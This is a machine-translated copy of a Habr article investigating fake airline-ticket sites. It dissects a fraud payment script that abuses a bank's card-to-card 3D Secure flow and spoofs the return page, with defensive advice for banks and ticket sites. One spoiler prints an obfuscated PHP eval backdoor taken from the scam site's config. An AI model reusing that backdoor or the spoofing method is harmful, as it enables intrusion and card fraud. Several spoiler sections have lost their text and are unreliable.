Menerima SMS. Di sebelah kiri bank pengirim. Di sebelah kanan bank penerima. </font></font><br>
<br>
<img src="https://habrastorage.org/files/463/935/875/46393587535a428384fc62522d5154ff.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sberbank, untuk beberapa alasan, ditunjukkan dalam waktu SMS GMT. Sebelumnya, saya tidak melihat ini di pesan dari bank ini.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dengan substitusi halaman kembali dinonaktifkan, ulangi pembayaran yang berhasil menggunakan skrip payp2.php ternyata berkali-kali. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saya mencoba membayar dari kartu lain. Setiap bank mengeluarkan formulir 3D Secure-nya. Tetapi ini tidak mengubah esensi. </font></font><br>
<br>
<img src="https://habrastorage.org/files/452/684/b75/452684b75ede43deaca4c3c448d77bf5.png"><br>
<br>
<img src="https://habrastorage.org/files/671/19c/d9f/67119cd9f13b4b1b92c43903c4a5a466.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Harap dicatat bahwa tidak semua bank memasukkan "deskripsi tambahan" dalam formulir konfirmasi mereka. Dalam contoh kita, “pembayaran tiket”.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tidak perlu beradaptasi dengan halaman masing-masing bank. Meskipun bentuknya berbeda, mekanisme substitusi untuk mereka adalah sama. Setiap bentuk setelah pembayaran berisi tautan dengan alamat halaman yang ingin Anda kembalikan. Bank sendiri, yang menyediakan formulir verifikasi 3D Secure, kemungkinan besar tidak akan dikembalikan ke "situs kiri". Tentunya, ada beberapa aturan dan bank dari formulir verifikasi 3DS setidaknya harus kembali ke domain yang sama dari mana permintaan pembayaran diterima. (Dalam kasus kami, di 3ds.payment.ru). Bank memverifikasi kode 3D Secure, seandainya kata sandi dimasukkan dengan benar, dalam kode html halaman menunjukkan alamat yang perlu dikembalikan, tetapi tidak dapat lagi mengontrol apakah akan kembali ke halaman ini.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sebagai hasil dari semua percobaan, dimungkinkan untuk mendapatkan skrip payp2p.php untuk membayar melalui layanan transfer dari kartu ke kartu Promsvyazbank 3ds.payment.ru. Pada saat yang sama, saya harus menonaktifkan penggantian alamat pengirim pada baris terakhir dari skrip. Ketika Anda menghidupkan spoofing dari alamat halaman kembali, seperti yang ada di skrip asli, pada saat ini uang benar-benar tidak lulus. Halaman verifikasi 3D Secure ditampilkan; SMS dengan "kata sandi" dikirim; formulir verifikasi tidak melompat ke langkah berikutnya ketika memasukkan kata sandi yang salah; setelah memasukkan "kata sandi" yang benar, dialihkan ke halaman palsu, tetapi uangnya tidak lulus.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pemalsuan alamat halaman kembali untuk pembayaran yang berhasil adalah bagian yang sangat penting untuk situs penipuan. Jika "pembeli tiket" tidak curiga bahwa ia telah ditipu, maka ia dapat membayar tidak hanya satu, tetapi beberapa pembelian tiket dan setelah itu untuk waktu yang lama (berhari-hari dan berminggu-minggu) tidak mengambil tindakan aktif untuk membatalkan pembayaran, dll. Jika pembeli setelah "membayar tiket pesawat" menerima konfirmasi transfer dari kartu ke kartu, maka kemungkinan besar ia tidak akan lagi melakukan pembayaran berikut, ia akan menghubungi banknya dan, mungkin, polisi lebih cepat. Ini berarti bahwa arus kas di situs-situs penipuan berkurang, kemungkinan pembatalan pembayaran di masa lalu meningkat, lembaga penegak hukum dan pekerja hosting mulai bertindak lebih awal, dan kemungkinan tidak memiliki waktu untuk menarik dana curian ke tempat yang aman meningkat.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Fakta bahwa skrip ini digunakan pada situs penipuan perang, saya tidak ragu. Saya punya alasan untuk percaya bahwa itu bekerja dalam bentuk yang disediakan untuk saya. Saat ini berfungsi terbatas (tidak ada pengalihan).</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekitar tiga minggu setelah bagian pertama dari publikasi diterbitkan, yang menyebutkan penipu menggunakan layanan transfer kartu ke kartu Promsvyazbank, bank ini membuat beberapa perubahan pada layanannya, yang saya anggap penting. Sebelumnya, ketika membayar melalui situs web Promsvyazbank, pembayar menerima SMS yang tidak dapat dipahami dengan teks "P2P PSBANK", tetapi sekarang mereka mulai menerima SMS dengan teks "CARD2CARD PSBANK.RU". Sekalipun demikian, sekilas, sedikit perubahan dalam dekripsi tujuan pembayaran sudah cukup bagi beberapa calon korban penipuan untuk membatalkan pembayaran pada tahap konfirmasi. Saya pikir ini bukan kebetulan, dan perubahan dibuat justru sebagai hasil dari publikasi artikel di GeekTimes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sangat mungkin bahwa setelah publikasi bagian pertama artikel, bersama dengan mengubah teks konfirmasi dalam SMS, penyesuaian tambahan dapat dilakukan untuk algoritma layanan transfer dari kartu ke kartu Promsvyazbank. </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Saya tidak bisa mengatakan 100%, tetapi pendapat saya adalah bahwa sebelum layanan Promsvyazbank 3ds.payment.ru dengan probabilitas tinggi tidak memeriksa pengembalian pengguna ke situs mereka setelah berhasil memasukkan kode 3D Secure di situs bank yang mengeluarkan pembayar kartu. Oleh karena itu, pembayaran dilakukan bahkan ketika skrip penipuan mengubah halaman kembali.</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bank, yang disebutkan berkali-kali dalam publikasi ini, beruntung dengan iklan gratis. Saya pikir pada kenyataannya masih ada cukup banyak bank seperti itu. Hanya saja ini lebih beruntung karena dipilih pertama kali untuk digunakan di situs penipuan, dan kemudian untuk analisis dalam artikel ini. Seperti yang mereka katakan, tidak ada pasien yang sehat, ada pasien yang tidak diperiksa dengan baik. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Saat menulis artikel ini, tugas membuat skrip penipuan perang tidak sepadan. Tugasnya adalah mencoba memahami cara kerjanya atau bekerja untuk memahami alasan mengapa "pembeli tiket pesawat" dapat ditipu, dan menarik kesimpulan dari hal ini.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Artikel ini menimbulkan banyak pertanyaan, tetapi tidak memberikan semua jawaban. </font><font style="vertical-align: inherit;">Saya yakin di antara pembaca akan ada cukup banyak pengguna tingkat lanjut yang dapat lebih akurat mengomentari gambaran klinis dan membuat diagnosis. </font><font style="vertical-align: inherit;">Untuk bagian saya, saya mencoba menyajikan kesaksian </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
selengkap </font><font style="vertical-align: inherit;">mungkin ... </font><font style="vertical-align: inherit;">Bagian dari publikasi dengan analisis skrip pembayaran selesai. </font><font style="vertical-align: inherit;">Bonus lebih lanjut untuk mereka yang bisa membaca di tempat ini.</font></font><br>
<hr><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dari mana datangnya tiket pesawat murah di situs penipuan? </font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pada bagian sebelumnya dari publikasi, dengan tanda tidak langsung, ditunjukkan bahwa informasi tentang ketersediaan tempat dan harga secara terprogram diperoleh pada beberapa situs yang jujur, dimodifikasi dan dikeluarkan untuk pengguna.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Contoh informasi tentang ketersediaan dan harga di situs web palsu</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7a5/1e4/8a8/7a51e48a8a3d4d8aabb8ea4acdbd053e.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kita memiliki kesempatan untuk melihat ke belakang layar dan melihat bagaimana ini diterapkan dalam kode program. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ini adalah tempat di kode dari situs penipuan di mana kita melihat dari mana gambar dan harga untuk penerbangan dari situs penipuan berasal. </font></font><br>
<br>
<img src="https://habrastorage.org/files/e65/0c5/25b/e650c525b0424acf861678766f7eb75c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seperti yang diharapkan dalam rangkaian situs penipuan ini, informasi tentang tempat yang tersedia diambil di situs yang jujur </font></font><code>www.aviacassa.ru</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Karena jumlah maskapai dan penerbangan yang besar, sangat sulit untuk mengunduh semua gambar dan ikon dalam masalah seperti itu sebelumnya, tautan ke gambar-gambar tersebut dibiarkan langsung ke situs asli. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Diskon dikurangi dari harga asli yang diterima untuk tiket pesawat. Seperti yang ditunjukkan sebelumnya, pemilik situs penipuan dapat secara sewenang-wenang menetapkan jumlah diskon. Jumlah diskon disimpan dalam file aviacfg.php.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sepotong kode yang lebih lengkap bertanggung jawab untuk memperoleh informasi tentang ketersediaan kursi, menyiapkan tautan ke gambar dan mengubah harga di bawah spoiler.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Parser harga - bagian kode yang lebih lengkap</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/cf0/e74/617/cf0e7461727a4415bf018283c1cdf15c.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami tidak akan membongkar potongan per baris ini, karena bukan kode itu sendiri yang penting, tetapi gagasan tentang bagaimana dan dari mana data sebenarnya tentang tiket pesawat untuk situs penipuan berasal. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parser lama menggunakan situs lain untuk mendapatkan data: </font></font><br>
<br>
<img src="https://habrastorage.org/files/e7e/625/9d8/e7e6259d8cc84a1586e61e7005ac6d3f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kiat untuk kantor tiket </font></font><code>(www.aviacassa.ru)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- Anda harus menutup kemungkinan tautan ke file domain dari pengarah eksternal (situs pengarah). </font><font style="vertical-align: inherit;">Peluang ini dapat ditutup untuk semua orang tanpa kecuali, atau Anda dapat membuat pengecualian hanya untuk mitra tepercaya. </font><font style="vertical-align: inherit;">Server web NGINX, yang menggunakan aviacassa, membuatnya mudah dilakukan. </font><font style="vertical-align: inherit;">Rekomendasi yang sama untuk semua situs serupa yang dapat digunakan sebagai "donor informasi".</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Jika situs penipuan tidak dapat langsung menautkan ke gambar di situs-situs seperti kantor tiket, ini akan mempersulit hidup mereka. Jumlah logo dan gambar dari berbagai maskapai tidak diketahui sebelumnya. Bahkan jika Anda mencoba mengunduh gambar di muka, Anda dapat melewati sesuatu, dan situs penipuan akan terlihat jelek. Situs-situs tersebut akan dipaksa untuk mengunduh semua gambar secara lokal ke server dengan setiap permintaan, atau setidaknya memeriksa apakah gambar seperti itu sebelumnya diunduh ke "cache" atau tidak. Ini meningkatkan beban pada server scam dan membuat rendering halaman lebih lambat. Selain itu, penutupan kemampuan untuk menautkan langsung ke gambar pada satu waktu akan membuat semua situs penipuan saat ini yang menggunakan informasi tiket kantor tidak beroperasi.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tentu saja, seiring waktu, pengembang akan membuat tambalan. </font><font style="vertical-align: inherit;">Tetapi karena situs penipuan tidak dikelola secara terpusat, dan berbagai orang tidak memiliki pembaruan perangkat lunak otomatis, setiap pemilik situs palsu harus mencari peluang untuk meningkatkan. </font><font style="vertical-align: inherit;">Seseorang akan menemukan kode yang diperbarui, tetapi seseorang tidak akan menemukan dan situs tersebut akan berhenti berfungsi. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Juga, kantor tiket dapat menyertakan log terpisah untuk gambar-gambar tersebut, di mana catatan tentang semua rujukan eksternal (situs rujukan) akan disimpan. </font><font style="vertical-align: inherit;">Dan dalam beberapa hari dalam log ini Anda akan mendapatkan daftar semua situs penipuan aktif. </font><font style="vertical-align: inherit;">Ini sangat mudah - alih-alih mencoba menemukan masing-masing situs, Anda dapat meminta mereka untuk mendaftar secara independen dalam daftar (file log).</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dan jika ada admin lucu di kantor tiket, Anda dapat membuat lelucon ...</font></font></b><div class="spoiler_text"> - NGINX           ,    ,  «»        ,         URL ,   .     .   —   « »   ,        -, ,  ,       ,     .</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Seseorang mungkin mengatakan bahwa publikasi artikel semacam itu berfungsi sebagai alat pelatihan untuk scammers dan mengajukan pertanyaan, mengapa saya mempostingnya di sini? Saya jawab. Jika ada cara mencuri uang, berdasarkan pada penggunaan perangkat lunak yang rentan atau kurang terlindungi, yang paling tidak diketahui oleh beberapa orang dan tujuannya adalah untuk menghasilkan uang, maka upaya untuk menyembunyikan informasi tersebut dan berpura-pura tidak ada masalah hanya mengarah ke konsekuensi yang lebih buruk. Penipu menggunakan metode ini bahkan lebih aktif, sementara bank senang karena mereka secara teratur membayar komisi untuk layanan dan mencuri uang dari mereka. Mengapa bank perlu mengubah sesuatu, jika semuanya begitu baik? Dari waktu ke waktu, hanya beberapa pengguna Internet yang tertipu dan kehilangan uang di situs-situs penipuan. Tapi siapa yang peduli?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pendapat saya adalah bahwa jika beberapa peluang "rumit" untuk mencuri uang diketahui oleh sejumlah besar orang, maka seiring waktu akan menjadi lebih sulit bagi penipu untuk menggunakannya, dan menjadi mustahil bagi organisasi yang menggunakannya untuk mengabaikan masalah. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Script payp2.php dan sejumlah file yang digunakan pada seri baru-baru ini situs penjualan maskapai yang curang dikirim kepada saya oleh pengguna </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">badai</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Saya tidak tahu di mana dia mendapatkannya - langsung semua pertanyaan tentang hal ini kepadanya secara langsung.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi saya dapat langsung mengatakan bahwa, ternyata kemudian, tidak sulit untuk menemukan serangkaian kode sumber lengkap untuk situs-situs palsu yang menjual tiket pesawat. </font><font style="vertical-align: inherit;">Mencari "penerbangan palsu." </font><font style="vertical-align: inherit;">Kedua mesin pencari utama menyediakan tautan di halaman pertama. </font><font style="vertical-align: inherit;">Satu set kode sumber lengkap hanya berharga 25-30 ton rubel. </font><font style="vertical-align: inherit;">Setelah topik ini berhenti berfungsi, kode sumber tidak berfungsi, yang menurut penjual “mudah untuk diselesaikan,” mulai menghabiskan biaya 10tr. </font><font style="vertical-align: inherit;">Baru-baru ini, dilihat dari pesan di forum, versi 2.0 diduga dijual kembali dengan harga 25tr. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di bawah ini adalah contoh spoiler penjualan gratis kode sumber situs web palsu untuk penjualan tiket pesawat di salah satu forum.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cuplikan layar forum. </font><font style="vertical-align: inherit;">(Rapi, gambar yang sangat panjang)</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7bc/69f/693/7bc69f6935294a76ba54c22e6fc2376f.jpg"><br>
<div class="spoiler"><b class="spoiler_title"> .  (2/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/823/4a0/f64/8234a0f641be4ef1a1acfe4fe4c8c7b4.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (3/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/147/0d7/d85/1470d7d857c2462c9a8948a64348d13e.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (4/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/743/5ad/aef/7435adaef04748b987b38b5cac75590a.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (5/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/1a1/519/eb6/1a1519eb638949be87239514e44edec9.jpg"><br>
</div></div><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Di forum, yang ditampilkan dalam tangkapan layar, kode situs web penipuan serupa, informasi kartu kredit, data paspor, informasi pribadi dari database negara secara terbuka dijual dan dibeli, diusulkan untuk membuat paspor palsu, SIM, dll. Ini hanya daftar pendek misalnya. Yaitu dengan pengecualian langka, ada kejahatan terus menerus. Pada saat yang sama, administrasi forum bertindak sebagai penjamin antara pembeli dan penjual. Ada beberapa forum seperti ini. Mereka semua bekerja dengan bebas selama bertahun-tahun. Semuanya diindeks dengan sempurna oleh mesin pencari (Yandex, Google, dll). Saya tidak mengutip alamat dari forum tertentu. Mereka sangat mudah ditemukan.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Karena di balik setiap situs web penipuan untuk penjualan tiket pesawat ada orang terpisah yang membeli kode sumber situs web dengan harga murah, dalam setiap kasus Anda dapat menemukan orang yang bertanggung jawab dan ini harus dilakukan. Tidak setiap admin dari situs palsu semacam itu adalah seorang profesional super yang jejaknya tidak dapat ditemukan. Saya yakin bahwa di antara admin seperti itu ada cukup banyak yang telah mewarisi dan, jika mereka memiliki wewenang yang sesuai, dapat dihitung. Tetapi, menurut pendapat saya, alih-alih mencoba menangani setiap situs palsu secara terpisah, Anda harus memperhatikan situs-situs tempat sumber situs palsu tersebut didistribusikan secara bebas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Untuk memberikan pukulan telak pada situs-situs palsu yang menjual tiket pesawat palsu, Anda tidak perlu banyak. Jika setiap orang melakukan sedikit, maka ini akan sangat menyulitkan kehidupan para penipu dan dapat menimbulkan pertanyaan tentang ketidakefisienan melakukan bisnis seperti itu. Dibutuhkan sedikit perhatian dari mesin pencari - untuk mencegah situs tersebut masuk ke iklan. Tidak realistis untuk memecah situs tersebut menjadi hasil teratas tanpa iklan. Juga, mesin pencari harus mengecualikan situs yang benar-benar membeli dan menjual skema kriminal. Butuh sedikit perhatian dari bank untuk melacak layanan pembayaran mereka sehingga penipu tidak dapat dengan mudah menggunakannya. Perlu sedikit perhatian dari tuan rumah. Anda perlu sedikit perhatian dari sistem pembayaran - untuk memulainya, jangan izinkan pembayaran tanpa memeriksa 3D Secure (seperti yang ditunjukkan di bagian pertama publikasi,masih mungkin). Butuh perhatian dari penegak hukum. Alih-alih menyelidiki setiap kasus pencurian uang, lebih efisien untuk bertindak di muka - berurusan dengan sarang di mana para scammer berkomunikasi (menganalisis, misalnya, forum yang sangat bayangan itu). Dan tentu saja Anda perlu sedikit perhatian dari calon pembeli tiket pesawat sendiri.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mereka mengatakan bahwa perbaikan tidak dapat diselesaikan, dan itu hanya dapat dihentikan. </font><font style="vertical-align: inherit;">Publikasi ini adalah kasus serupa. </font><font style="vertical-align: inherit;">Karena itu, walaupun lebih banyak yang dapat ditulis, saya akan berhenti di sini. </font><font style="vertical-align: inherit;">Terima kasih atas perhatian anda </font><font style="vertical-align: inherit;">Saya akan senang dengan komentar Anda.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS Tentang Jackie Chan ... Anda tidak bisa membaca</font></font></b><div class="spoiler_text">      ,       ,           ,    ,      .<br>
<br>
          ,       , ,   ,     - .      .        .<br>
<br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">   fon.png.    ,   ,  .    (merch)    .    .<br>
<br>
           . , -      ,    .    .        .<br>
<img src="https://habrastorage.org/files/d79/ff7/9c4/d79ff79c458d4bd9ad5c15987f410a8b.png"><br>
<br>
         VISA  Mastercard     (logo_standart_ru.png):<br>
<br>
<img src="https://habrastorage.org/files/596/f44/183/596f4418373846908dcede64835821c4.png"><br>
<br>
    .   , .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">       parser.php</b><div class="spoiler_text"><img src="https://habrastorage.org/files/0a9/dd4/b36/0a9dd4b36e6b45ed9aa6f5584dc2adec.png"><br>
<br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text">    ,   ,   ,    - . ,    -,      «» .  (config.php)     ,  .                .     .     .          .<br>
<br>
<img src="https://habrastorage.org/files/65d/4e6/484/65d4e6484eca40468fdab34568130804.png"><br>
<br>
<pre><code class="php hljs"><span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,<font></font>
<font></font>
<span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,
</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title"> .       </b><div class="spoiler_text"><img src="https://habrastorage.org/files/d28/976/6b8/d289766b88b640119c267f7721f8be25.png"><br>
<br>
     ,      ,  ,  «»      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">     email  </b><div class="spoiler_text">     ,  EMAIL.  :<br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"> <br>
       3ds.payment.ru       <code>Lakhtin@psbank.ru</code>.<br>
<br>
 ,      ? ,    - . , ,     Mastercard     3DS.<br>
<br>
<code>https://www.mastercard.us/content/dam/mccom/en-us/documents/SecureCode%20Vendor%20list/3ds-vendor-list-042215.pdf</code><br>
<br>
<div class="spoiler"><b class="spoiler_title">         Mastercard</b><div class="spoiler_text"><img src="https://habrastorage.org/files/568/5a5/70f/5685a570faf943c191ab61e9927b5e17.png"><br>
</div></div><br>
 email            .      -      .      -         . ..  - ,      ,     ,      - .<br>
<br>
  ,   email      ?     . ,  -,        .          ,     .            .     ,           ,   -   -   ,     ,      .<br>
<br>
          . , - -   email    .  ,   ,              .   ,       .   ,    ,        ,           .       -  , ,   ,  email  -,    -           . (,       ,    ..     ).      ,     .. .     .  ,          -,      .  ,       ,      ,      ,    .          .     ,     -, ,           .         , ,   ,     ,     . <br>
<br>
       ?         ,     .  email  , , .     .   -  ,     -   ,        .</div></div><br>
<div class="spoiler"><b class="spoiler_title">   ?</b><div class="spoiler_text">    ,     , «»   3ds.payment.ru,    .    ,          LaravelRUS    ,      Curl   3ds.payment.ru. <br>
<br>
     ,      .       ?   ?  ?<br>
 ,          ,     .<br>
<br>
<img src="https://habrastorage.org/files/51b/341/bd4/51b341bd4e9143a3b9c41fbf5288e33e.png"><br>
<br>
<img src="https://habrastorage.org/files/aac/503/90c/aac50390ca644df2a8ce9de00bc2425a.png"><br>
<br>
<img src="https://habrastorage.org/files/5e0/1f8/d30/5e01f8d302c14d229d64f7b0b52a2112.png"><br>
<br>
      .   . -    .<br>
<br>
<img src="https://habrastorage.org/files/8ee/d73/b76/8eed73b765f94a1ba8de070278a3d8df.png"><br>
<br>
 :<br>
<br>
» <code>https://gitter.im/LaravelRUS/chat/archives/2016/05/06</code> —      .       .<br>
» <code>http://gitchat.org/developers/Valtas</code> —     <br>
» <code>https://github.com/Valtas</code> —    Github<br>
» <code>https://www.fl.ru/tu/57770/parser-internet-magazina.html -   .</code><br>
<br>
       ,  ,     —      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">      </b><div class="spoiler_text">  ,        .       ,      .          ,   .<br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">http://forum.prootzyvy.org/forums/spisok-sajtov-moshennikov-po-prodazhe-aviabiletov.134/</a><br>
<br>
    336 .           ,     .      .<br>
<br>
<div class="spoiler"><b class="spoiler_title">        </b><div class="spoiler_text"><img src="https://habrastorage.org/files/ca0/31e/669/ca031e669c344a2fad4af30380977d80.png"><br>
</div></div><br>
        ?   ,     .   .    ,   .                  ,  ,  ,    ..      ,    .        ,   ,     .   ,     -   « »         .     (     ).     - 5-10-20     ..   ,   ,        ,    .    (),  ,    ,     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">.     ?</b><div class="spoiler_text">               .        .           ,     .      ,      .          «.  ».    ,                 .      ,            .               .   .         .<br>
<br>
       ,        ,   . ,   ,      -,        .    ,     .    ,   ,          . <br>
<br>
       ,     .    ,       . ,              .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">         ,             ,           .     -   -     .       .       ,    .<br>
<br>
<img src="https://habrastorage.org/files/cfb/9df/65c/cfb9df65c6d34e2ea70ee2d078901119.png"><br>
<br>
  80   ,          .    ,    .        ,  .     :<br>
<br>
<img src="https://habrastorage.org/files/7f7/05b/2eb/7f705b2ebb5d4b5bb19bc37eeb6e7c16.png"><br>
<br>
     56      , « »,     ,    . <br>
     ,   ,  « »,     ,     .<br>
<br>
       :<br>
<br>
<img src="https://habrastorage.org/files/6f8/ef9/849/6f8ef98493bc40c1949431241c59d0a0.png"><br>
<br>
<img src="https://habrastorage.org/files/52f/15a/2ea/52f15a2eaf94401baf1a7995169b2470.png"><br>
<br>
     -  -.          ,     .   ,          .     .  ,     .    ,          ,   ,  . <br>
</div></div><br>
</div></div></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id398313/">https://habr.com/ru/post/id398313/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id398301/index.html">Rumah pintar atau mainan untuk pria: pengontrol suhu</a></li>
<li><a href="../id398303/index.html">Tujuh-ratus Ideapad - review laptop gaming Y-series</a></li>
<li><a href="../id398305/index.html">Terjemahan buku kedua dari seri "Memori Masa Lalu Bumi", "Hutan Gelap" - selesai. Selamat membaca</a></li>
<li><a href="../id398309/index.html">Masalah robotika 2 modern, atau bagaimana game akan menyelamatkan dunia ...</a></li>
<li><a href="../id398311/index.html">Tentakel Mekanik Manual di Rumah: Bagian 2, Manajemen Kabel</a></li>
<li><a href="../id398315/index.html">Как фотоны воспринимают время?</a></li>
<li><a href="../id398317/index.html">Rumah-dengan-Pikiran atau otomatisasi di luar kotak</a></li>
<li><a href="../id398319/index.html">Bart Knolls - Pembunuh Nyamuk Tanpa Kompromi</a></li>
<li><a href="../id398321/index.html">Membunuh Keluarga - Suatu Strategi Evolusi yang ketinggalan zaman</a></li>
<li><a href="../id398323/index.html">Aktor suara video game bersiap untuk mogok kerja bagi pengembang</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
